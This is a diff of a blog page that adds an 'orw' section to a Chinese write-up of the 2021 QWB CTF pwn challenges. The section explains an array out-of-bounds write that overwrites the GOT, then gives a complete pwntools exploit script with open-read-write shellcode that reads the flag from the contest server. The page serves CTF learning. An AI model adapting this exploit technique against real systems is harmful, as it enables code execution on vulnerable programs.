@@ -27,6 +27,10 @@
 <meta property="og:site_name" content="ABf1ag&#39;s blog">
 <meta property="og:description" content="强网杯2021pwn">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210624223626019.png">
+<meta property="og:image" content="http://example.com/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210624223507894.png">
+<meta property="og:image" content="http://example.com/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210624223802601.png">
+<meta property="og:image" content="http://example.com/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210624224218597.png">
 <meta property="og:image" content="http://example.com/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210613203304850.png">
 <meta property="og:image" content="http://example.com/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210614214525726.png">
 <meta property="og:image" content="http://example.com/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210614220431762.png">
@@ -40,10 +44,10 @@
 <meta property="og:image" content="http://example.com/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210624214952498.png">
 <meta property="og:image" content="http://example.com/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/ABf1ag-blog/source_posts/强网杯2021pwn/image-20210624215632483.png">
 <meta property="article:published_time" content="2021-06-13T12:25:57.000Z">
-<meta property="article:modified_time" content="2021-06-24T14:04:25.797Z">
+<meta property="article:modified_time" content="2021-06-24T14:48:10.951Z">
 <meta property="article:author" content="ABf1ag">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210613203304850.png">
+<meta name="twitter:image" content="http://example.com/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210624223626019.png">
 
 <link rel="canonical" href="http://example.com/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/">
 
@@ -198,7 +202,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-06-24 22:04:25" itemprop="dateModified" datetime="2021-06-24T22:04:25+08:00">2021-06-24</time>
+                <time title="Modified: 2021-06-24 22:48:10" itemprop="dateModified" datetime="2021-06-24T22:48:10+08:00">2021-06-24</time>
               </span>
 
           
@@ -214,6 +218,18 @@
       
         <p><strong>强网杯2021pwn</strong></p>
 <span id="more"></span>
+
+<h3 id="orw（数组越界）"><a href="#orw（数组越界）" class="headerlink" title="orw（数组越界）"></a>orw（数组越界）</h3><p><img src="/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210624223626019.png" alt="image-20210624223626019"></p>
+<p><img src="/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210624223507894.png" alt="image-20210624223507894"></p>
+<p>pwn的签到题，没做出来，裂开。。。</p>
+<p>开了沙箱，发现v1和v2都是int型，且没有对v1进行判断，可以写入负数进行越界，覆盖到got表</p>
+<p><img src="/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210624223802601.png" alt="image-20210624223802601"></p>
+<p>当v2=0时，也就是a2=0，<code>++buf</code>就不会等于<code>&amp;a1[a2]</code>,就可以不限个数输入字符，构造shellcode。</p>
+<p><img src="/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210624224218597.png" alt="image-20210624224218597"></p>
+<p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">context.arch=&#x27;amd64&#x27;</span><br><span class="line">remote_addr=[&quot;39.105.131.68&quot;,12354] </span><br><span class="line">def add(index,size,content):</span><br><span class="line"> p.recvuntil(&#x27;choice &gt;&gt;\n&#x27;)</span><br><span class="line"> p.sendline(&#x27;1&#x27;)</span><br><span class="line"> p.recvuntil(&#x27;index:\n&#x27;)</span><br><span class="line"> p.sendline(str(index))</span><br><span class="line"> p.recvuntil(&#x27;size:\n&#x27;)</span><br><span class="line"> p.sendline(str(size))</span><br><span class="line"> p.recvuntil(&#x27;content:\n&#x27;)</span><br><span class="line"> p.sendline(content)</span><br><span class="line"></span><br><span class="line">shellcode=&#x27;&#x27;&#x27;</span><br><span class="line">xor rdi,rdi</span><br><span class="line">mov rdi,0x67616c662f</span><br><span class="line">push rdi</span><br><span class="line">mov rdi,rsp</span><br><span class="line">xor rsi,rsi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">mov rax,2</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov rdi, rax</span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov rdx, 0x50</span><br><span class="line">mov rax,0</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov rdi,1</span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov rdx,rax</span><br><span class="line">mov rax,1</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov rdi,0</span><br><span class="line">mov rax,60</span><br><span class="line">syscall</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">print shellcode</span><br><span class="line">p=remote(remote_addr[0],remote_addr[1])</span><br><span class="line">add(-25,0,shellcode) #0x0000555555757160</span><br><span class="line">p.sendline(&#x27;4&#x27;)</span><br><span class="line">p.sendline(&#x27;0&#x27;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
 
 <h3 id="no-output（signal函数）"><a href="#no-output（signal函数）" class="headerlink" title="no_output（signal函数）"></a>no_output（signal函数）</h3><p>程序只开了NX保护。</p>
 <p>程序主函数如下：</p>
@@ -332,7 +348,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#no-output%EF%BC%88signal%E5%87%BD%E6%95%B0%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">no_output（signal函数）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shellcode%EF%BC%88alpha3%E4%BD%BF%E7%94%A8%E3%80%8132%E4%BD%8D64%E4%BD%8D%E6%A8%A1%E5%BC%8F%E8%BD%AC%E6%8D%A2%EF%BC%89"><span class="nav-number">2.</span> <span class="nav-text">shellcode（alpha3使用、32位64位模式转换）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#baby-biary-libc-2-32%E4%B8%8B%E7%9A%84off-by-null"><span class="nav-number">3.</span> <span class="nav-text">baby_biary(libc-2.32下的off-by-null)</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#orw%EF%BC%88%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">orw（数组越界）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#no-output%EF%BC%88signal%E5%87%BD%E6%95%B0%EF%BC%89"><span class="nav-number">2.</span> <span class="nav-text">no_output（signal函数）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shellcode%EF%BC%88alpha3%E4%BD%BF%E7%94%A8%E3%80%8132%E4%BD%8D64%E4%BD%8D%E6%A8%A1%E5%BC%8F%E8%BD%AC%E6%8D%A2%EF%BC%89"><span class="nav-number">3.</span> <span class="nav-text">shellcode（alpha3使用、32位64位模式转换）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#baby-biary-libc-2-32%E4%B8%8B%E7%9A%84off-by-null"><span class="nav-number">4.</span> <span class="nav-text">baby_biary(libc-2.32下的off-by-null)</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
